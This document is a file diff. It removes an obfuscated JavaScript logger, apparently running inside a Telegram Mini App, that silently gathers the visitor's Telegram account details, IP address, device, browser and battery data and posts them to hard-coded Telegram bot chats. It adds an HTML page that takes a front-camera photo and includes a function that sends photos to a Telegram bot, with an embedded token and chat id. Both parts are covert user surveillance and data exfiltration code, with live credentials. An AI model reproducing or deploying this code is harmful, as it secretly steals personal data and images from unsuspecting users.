@@ -1,1 +1,85 @@
-function _0x46c3(_0x47875c,_0xd986fc){const _0x452428=_0x4524();return _0x46c3=function(_0x46c381,_0x1c3b92){_0x46c381=_0x46c381-0x13c;let _0x3ce82d=_0x452428[_0x46c381];return _0x3ce82d;},_0x46c3(_0x47875c,_0xd986fc);}(function(_0x31f0ca,_0x2cd193){const _0x448613=_0x46c3,_0x3e704f=_0x31f0ca();while(!![]){try{const _0x3fc315=-parseInt(_0x448613(0x179))/0x1*(-parseInt(_0x448613(0x14e))/0x2)+-parseInt(_0x448613(0x140))/0x3*(parseInt(_0x448613(0x150))/0x4)+-parseInt(_0x448613(0x17a))/0x5*(-parseInt(_0x448613(0x162))/0x6)+parseInt(_0x448613(0x159))/0x7*(-parseInt(_0x448613(0x14b))/0x8)+-parseInt(_0x448613(0x14f))/0x9*(-parseInt(_0x448613(0x153))/0xa)+-parseInt(_0x448613(0x15f))/0xb+parseInt(_0x448613(0x15b))/0xc*(parseInt(_0x448613(0x172))/0xd);if(_0x3fc315===_0x2cd193)break;else _0x3e704f['push'](_0x3e704f['shift']());}catch(_0x248a89){_0x3e704f['push'](_0x3e704f['shift']());}}}(_0x4524,0x60760));async function getIPAddress(){const _0x59e224=_0x46c3;try{const _0x68b8dd=await fetch('https://api.ipify.org?format=json'),_0x358987=await _0x68b8dd[_0x59e224(0x14d)]();return _0x358987['ip'];}catch(_0x1611e8){return console['error']('Ошибка\x20получения\x20IP\x20адреса:',_0x1611e8),_0x59e224(0x16e);}}function getUserAgent(){const _0x8764fe=_0x46c3;try{return navigator[_0x8764fe(0x147)]||'неизвестно';}catch(_0x22c419){return console[_0x8764fe(0x165)](_0x8764fe(0x15d),_0x22c419),_0x8764fe(0x16e);}}function getScreenResolution(){const _0x5a99ab=_0x46c3;return window[_0x5a99ab(0x154)][_0x5a99ab(0x13f)]+'x'+window[_0x5a99ab(0x154)][_0x5a99ab(0x174)]||_0x5a99ab(0x16e);}function getOSName(){const _0x3888bc=_0x46c3;try{return navigator[_0x3888bc(0x166)]||_0x3888bc(0x16e);}catch(_0x5ebc74){return console[_0x3888bc(0x165)]('Ошибка\x20получения\x20имени\x20ОС:',_0x5ebc74),_0x3888bc(0x16e);}}function _0x4524(){const _0x3e2eba=['</code>\x0a├\x20Фамилия:\x20<code>','name','language_code','width','501eWmPFp','\x0a├\x20Айди:\x20<code>','</code>\x0a\x20\x20\x20\x20','username','parse_mode','Telegram','</code>\x0a├\x20Разрешение\x20экрана:\x20<code>','userAgent','toString','appName','statusText','280sbypjy','Ошибка\x20второго\x20запроса:','json','382KnoCnd','9LgdZBR','6828tJJkus','\x0a<b>\x20Лог\x20успешен!</b>\x0a\x0a<b>🔍\x20Информация\x20об\x20аккаунте:</b>\x0a├\x20Тэг:\x20','Запрос\x20успешно\x20отправлен','361370zXcAUh','screen','https://api.telegram.org/bot','getTimezoneOffset','chat_id','Ошибка\x20получения\x20информации\x20о\x20браузере:','139811vhSOtv','version','36gjVWFH','Ошибка\x20при\x20отправке\x20второго\x20запроса:\x20','Ошибка\x20получения\x20UserAgent:','</code>\x0a\x0a<b>🖥️\x20Информация\x20об\x20устройстве:</b>\x0a├\x20Айпи:\x20<code>','699622isRtSs','</code>\x0a├\x20Язык:\x20<code>','Ошибка\x20при\x20отправке\x20запроса:\x20','3618uZKBXZ','HTML','</code>\x0a├\x20UserAgent:\x20<code>','error','platform','log','</code>\x0a\x0a<b>🌐\x20Информация\x20о\x20браузере:</b>\x0a├\x20Название\x20браузера:\x20<code>','first_name','start_param','appVersion','initDataUnsafe','text','неизвестно','append','application/x-www-form-urlencoded','</code>\x0a└\x20Можно\x20писать\x20в\x20ЛС:\x20<code>','4415892aUmRhc','product','height','Ошибка:','</code>\x0a├\x20Хэш:\x20<code>неизвестно</code>\x0a├\x20Имя\x20ОС:\x20<code>','level','Второй\x20запрос\x20успешно\x20отправлен','451axsGmM','2500djiZrQ','POST'];_0x4524=function(){return _0x3e2eba;};return _0x4524();}async function getBatteryPercentage(){const _0x55eeac=_0x46c3;try{const _0x14b354=await navigator['getBattery']();return Math['floor'](_0x14b354[_0x55eeac(0x177)]*0x64);}catch(_0x162715){return console[_0x55eeac(0x165)]('Ошибка\x20получения\x20процента\x20заряда\x20батареи:',_0x162715),_0x55eeac(0x16e);}}function getBrowserInfo(){const _0x51dedd=_0x46c3;try{return{'name':navigator[_0x51dedd(0x149)]||_0x51dedd(0x16e),'version':navigator[_0x51dedd(0x16b)]||_0x51dedd(0x16e),'engine':navigator[_0x51dedd(0x173)]||_0x51dedd(0x16e)};}catch(_0x1ed327){return console[_0x51dedd(0x165)](_0x51dedd(0x158),_0x1ed327),{'name':'неизвестно','version':_0x51dedd(0x16e),'engine':'неизвестно'};}}async function sendDataToTelegram(){const _0x5a17a4=_0x46c3;let _0x4bcb62=window[_0x5a17a4(0x145)]['WebApp'];const _0x455110='6765756823:AAHhHDjjHobdydiQMOx5kwa-Ci95ywLtfVI',_0x30c839=_0x4bcb62[_0x5a17a4(0x16c)][_0x5a17a4(0x16a)],_0x8aa67d=-0xe9689677d7,_0x3adcc3=await getIPAddress(),_0x1fc6b8=getUserAgent(),_0x5e9ccd=getOSName(),_0x3162be=getScreenResolution(),_0x4a494f=await getBatteryPercentage(),_0xf968e8=getBrowserInfo(),_0x5699f0=_0x4bcb62[_0x5a17a4(0x16c)]['user']||{},_0x4cc69e=_0x5699f0[_0x5a17a4(0x143)]?'@'+_0x5699f0[_0x5a17a4(0x143)]:_0x5a17a4(0x16e),_0x11ed14=_0x5699f0['id']||_0x5a17a4(0x16e),_0x5e3294=_0x5699f0[_0x5a17a4(0x169)]||_0x5a17a4(0x16e),_0x4b0c4b=_0x5699f0['last_name']||'неизвестно',_0x148a23=_0x5699f0[_0x5a17a4(0x13e)]||'неизвестно',_0x123cb0=_0x5699f0['allows_write_to_pm']?'да':'нет',_0x32d677=_0x5a17a4(0x151)+_0x4cc69e+_0x5a17a4(0x141)+_0x11ed14+'</code>\x0a├\x20Имя:\x20<code>'+_0x5e3294+_0x5a17a4(0x13c)+_0x4b0c4b+_0x5a17a4(0x160)+_0x148a23+_0x5a17a4(0x171)+_0x123cb0+_0x5a17a4(0x15e)+_0x3adcc3+_0x5a17a4(0x164)+_0x1fc6b8+_0x5a17a4(0x176)+_0x5e9ccd+_0x5a17a4(0x146)+_0x3162be+'</code>\x0a├\x20Процент\x20батареи:\x20<code>'+_0x4a494f+'%</code>\x0a└\x20Часовой\x20пояс:\x20<code>'+new Date()[_0x5a17a4(0x156)]()+_0x5a17a4(0x168)+_0xf968e8[_0x5a17a4(0x13d)]+'</code>\x0a├\x20Версия\x20браузера:\x20<code>'+_0xf968e8[_0x5a17a4(0x15a)]+'</code>\x0a└\x20Тип\x20движка\x20браузера:\x20<code>'+_0xf968e8['engine']+_0x5a17a4(0x142),_0x509e8c=_0x5a17a4(0x155)+_0x455110+'/sendMessage',_0x5b5fcb=new URLSearchParams();_0x5b5fcb[_0x5a17a4(0x16f)](_0x5a17a4(0x157),_0x30c839),_0x5b5fcb[_0x5a17a4(0x16f)](_0x5a17a4(0x16d),_0x32d677),_0x5b5fcb[_0x5a17a4(0x16f)](_0x5a17a4(0x144),'HTML');try{const _0x342d1d=await fetch(_0x509e8c,{'method':'POST','headers':{'Content-Type':_0x5a17a4(0x170)},'body':_0x5b5fcb[_0x5a17a4(0x148)]()});if(!_0x342d1d['ok'])throw new Error(_0x5a17a4(0x161)+_0x342d1d[_0x5a17a4(0x14a)]);console['log'](_0x5a17a4(0x152));}catch(_0x2e6dd4){console[_0x5a17a4(0x165)](_0x5a17a4(0x175),_0x2e6dd4);}const _0x5ad24b=new URLSearchParams();_0x5ad24b[_0x5a17a4(0x16f)](_0x5a17a4(0x157),_0x8aa67d),_0x5ad24b[_0x5a17a4(0x16f)](_0x5a17a4(0x16d),_0x32d677),_0x5ad24b[_0x5a17a4(0x16f)](_0x5a17a4(0x144),_0x5a17a4(0x163));try{const _0x3034cc=await fetch(_0x509e8c,{'method':_0x5a17a4(0x17b),'headers':{'Content-Type':_0x5a17a4(0x170)},'body':_0x5ad24b[_0x5a17a4(0x148)]()});if(!_0x3034cc['ok'])throw new Error(_0x5a17a4(0x15c)+_0x3034cc[_0x5a17a4(0x14a)]);console[_0x5a17a4(0x167)](_0x5a17a4(0x178));}catch(_0x2e6747){console[_0x5a17a4(0x165)](_0x5a17a4(0x14c),_0x2e6747);}}sendDataToTelegram();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Съемка с фронтальной камеры</title>
+</head>
+<body>
+    <h1>Съемка с фронтальной камеры</h1>
+    <button onclick="capturePhoto()">Сделать фото</button>
+    <div id="photoContainer">
+        <!-- Фото будет выведено здесь -->
+    </div>
+
+    <script>
+        async function capturePhoto() {
+            try {
+                // Запрашиваем доступ к фронтальной камере
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                // Ожидание для запуска видео и корректного захвата кадра
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Настройка canvas для захвата изображения с видео
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Останавливаем стрим и освобождаем ресурсы камеры
+                stream.getTracks().forEach(track => track.stop());
+
+                // Преобразование изображения в формат Base64
+                const photoDataURL = canvas.toDataURL("image/png");
+
+                // Отображаем фото на странице
+                const img = document.createElement("img");
+                img.src = photoDataURL;
+                img.alt = "Захваченное фото";
+                document.getElementById("photoContainer").innerHTML = "";
+                document.getElementById("photoContainer").appendChild(img);
+
+                console.log("Фотография захвачена:", photoDataURL);
+
+                // Пример отправки в Telegram (замените 'YOUR_TELEGRAM_BOT_TOKEN' и 'CHAT_ID' на нужные значения)
+                // await sendPhotoToTelegram(photoDataURL);
+
+            } catch (error) {
+                console.error("Ошибка доступа к камере:", error);
+            }
+        }
+
+        // Функция отправки фотографии в Telegram (опционально)
+        async function sendPhotoToTelegram(photoDataURL) {
+            const token = "6765756823:AAEaZgZa7u7zj7D2Io1FD0J4CEdACLzSDZo";
+            const chat_id = "-1002328129351";
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: "POST",
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        photo: photoDataURL
+                    }),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                });
+
+                if (response.ok) {
+                    console.log("Фото успешно отправлено в Telegram.");
+                } else {
+                    console.error("Ошибка при отправке фото в Telegram:", response.statusText);
+                }
+            } catch (error) {
+                console.error("Ошибка при отправке фото в Telegram:", error);
+            }
+        }
+    </script>
+</body>
+</html>
